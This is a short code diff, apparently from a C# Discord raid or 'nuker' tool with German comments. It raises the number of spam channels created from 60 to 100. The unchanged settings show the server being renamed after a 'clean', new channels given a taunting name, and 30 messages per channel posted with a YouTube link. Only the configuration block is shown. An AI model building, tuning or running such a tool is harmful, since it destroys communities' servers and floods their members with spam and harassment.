@@ -9,7 +9,7 @@ class Program
     // ── Hier alles anpassen ───────────────────────────────────────────────────
     const string SERVER_NAME   = "GEBEMEIERS UNZUCHT"; // Servername nach dem Clean
     const string CHANNEL_NAME  = "sie wurden gegebemeiert";       // Name der neuen Kanäle
-    const int    CHANNEL_COUNT = 60;                   // Anzahl der Kanäle
+    const int    CHANNEL_COUNT = 100;                   // Anzahl der Kanäle
     const int    MESSAGE_COUNT = 30;                   // Nachrichten pro Kanal
     const string MESSAGE_TEXT  =
         "✅ **https://youtu.be/4Lc-LarMzSc?is=TWhwIqrlVgo9td9X**\n" +
